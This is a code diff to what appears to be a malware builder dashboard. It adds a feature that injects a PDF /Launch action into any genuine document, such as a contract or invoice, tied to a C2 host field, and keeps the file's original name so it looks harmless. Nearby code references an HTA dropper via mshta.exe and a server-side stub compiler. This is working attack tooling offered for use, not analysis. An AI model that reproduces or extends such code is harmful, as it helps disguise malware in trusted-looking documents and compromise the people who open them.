@@ -582,6 +582,22 @@ function renderBuilder() {
     </div>
   </div>
 
+  <div style="background:var(--bg);border:1px solid var(--warn);border-radius:8px;padding:12px;display:flex;flex-direction:column;gap:8px">
+    <div style="font-size:11px;font-weight:600;color:var(--warn)">&#128228; Inject /Launch into YOUR own PDF</div>
+    <p style="font-size:11px;color:var(--muted);line-height:1.6">
+      Upload any real PDF (report, contract, invoice). The /Launch action is appended via PDF incremental update — the original document stays fully intact and readable. The file keeps its original name.
+    </p>
+    <div style="display:flex;gap:8px;align-items:center;flex-wrap:wrap">
+      <input id="inject-pdf-input" type="file" accept=".pdf"
+        style="flex:1;min-width:180px;background:var(--bg2);border:1px solid var(--bg3);border-radius:6px;color:var(--text);font-size:12px;padding:6px 9px">
+      <button id="inject-pdf-btn" class="btn btn-sec" onclick="injectAndDownload()"
+        style="font-size:12px;padding:8px 14px;border-color:var(--warn);color:var(--warn);white-space:nowrap">
+        Inject /Launch + Download
+      </button>
+    </div>
+    <div id="inject-pdf-status" style="font-size:11px;color:var(--muted);display:none"></div>
+  </div>
+
   <div style="display:grid;grid-template-columns:repeat(auto-fill,minmax(140px,1fr));gap:8px;margin-top:4px">
     <button class="btn btn-sec" onclick="downloadCarrier('hta')" style="font-size:12px;padding:9px 10px">
       &#128196; HTA Dropper<br><span style="font-size:10px;color:var(--muted)">mshta.exe</span>
@@ -842,6 +858,49 @@ function doCompile() {
     btn.disabled = false;
     btn.textContent = '⚙ Compile Stub.exe on Server';
   });
+}
+
+async function injectAndDownload() {
+  const fileInput = document.getElementById('inject-pdf-input');
+  const btn       = document.getElementById('inject-pdf-btn');
+  const status    = document.getElementById('inject-pdf-status');
+  if (!fileInput.files.length) { alert('Select a PDF file first'); return; }
+
+  const fd = new FormData();
+  fd.append('pdf', fileInput.files[0]);
+  const c2host = document.getElementById('b-host')?.value.trim();
+  if (c2host) fd.append('c2host', c2host);
+
+  btn.disabled = true; btn.textContent = 'Injecting…';
+  status.style.display = 'block'; status.style.color = 'var(--muted)';
+  status.textContent = 'Uploading and injecting /Launch action…';
+
+  try {
+    const r = await fetch(API_BASE + '/api/builder/inject-pdf', {
+      method: 'POST', body: fd, credentials: 'include'
+    });
+    if (!r.ok) {
+      const e = await r.json().catch(() => ({ error: r.statusText }));
+      status.style.color = '#e74c3c';
+      status.textContent = 'Error: ' + (e.error || r.statusText);
+      return;
+    }
+    const blob = await r.blob();
+    const cd   = r.headers.get('content-disposition') || '';
+    const nm   = (cd.match(/filename="([^"]+)"/) || [])[1] || fileInput.files[0].name;
+    const url  = URL.createObjectURL(blob);
+    const a    = document.createElement('a');
+    a.href = url; a.download = nm;
+    document.body.appendChild(a); a.click(); a.remove();
+    URL.revokeObjectURL(url);
+    status.style.color = 'var(--accent)';
+    status.textContent = '✓ Done — ' + nm + ' downloaded with /Launch injected.';
+  } catch (e) {
+    status.style.color = '#e74c3c';
+    status.textContent = 'Error: ' + e.message;
+  } finally {
+    btn.disabled = false; btn.textContent = 'Inject /Launch + Download';
+  }
 }
 
 async function downloadCarrier(type) {
